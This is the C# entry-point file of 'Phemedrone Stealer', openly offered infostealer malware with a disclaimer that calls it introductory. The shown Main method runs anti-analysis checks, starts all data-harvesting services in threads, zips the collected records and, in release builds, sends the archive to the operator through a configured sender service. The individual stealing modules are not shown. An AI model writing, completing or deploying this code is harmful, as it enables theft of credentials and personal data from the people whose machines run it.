/*
    Phemedrone Stealer
    !WARNING! ALL CODE IS FOR INTRODUCTORY PURPOSES WE ARE NOT RESPONSIBLE FOR YOUR ACTIONS !WARNING!
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using Phemedrone.Classes;
using Phemedrone.Extensions;
using Phemedrone.Services;

namespace Phemedrone
{
    internal static class Program
    {
        public static void Main()
        {
            Protections.CheckAll.Check();
            var ms = new MemoryStream();
            var comment = Encoding.ASCII.GetString(Convert.FromBase64String(Information.GetComment()));
            using (var zip = ZipStorage.Create(ms, comment))
            {
                RuntimeResolver.GetInheritedClasses<IService>()
                    .GroupBy(s => s.Priority)
                    .Select(s => s.ToList())
                    .ToList().ForEach(s =>
                    {
                        var threads = s.Select(service => new Thread(service.Run)).ToList();
                        threads.ForEach(t => t.Start());
                        threads.ForEach(t => t.Join());
                        s.ForEach(service =>
                        {
                            try
                            {
                                IService.AddRecords(service.Entries, zip);
                                service.Dispose();
                            }
                            catch
                            {
                              // error lol  
                            }
                        });
                    });
                IService.AddRecords(ServiceCounter.Finalize(), zip);
            }
            // Build ONLY in RELEASE mode
#if DEBUG
            File.WriteAllBytes(Information.GetFileName(), ms.ToArray());
#else
            Config.SenderService.Send(ms.ToArray());
#endif
        }
    }
}